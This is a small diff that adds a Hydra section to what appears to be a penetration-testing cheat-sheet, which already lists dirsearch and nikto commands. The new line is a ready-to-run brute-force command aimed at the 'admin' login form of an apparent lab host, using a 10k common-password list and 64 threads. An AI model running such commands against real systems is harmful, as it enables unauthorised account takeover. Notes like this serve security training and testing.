@@ -18,3 +18,12 @@ python3 dirsearch.py -u <URL> -e <EXTENSION>
 ```
 nikto -h IP_ADDR
 ```
+
+## Bruteforce
+
+## Hydra
+
+```
+//Bruteforce login form (Invalid is the error message return when a wrong password is provided"
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64 
+```
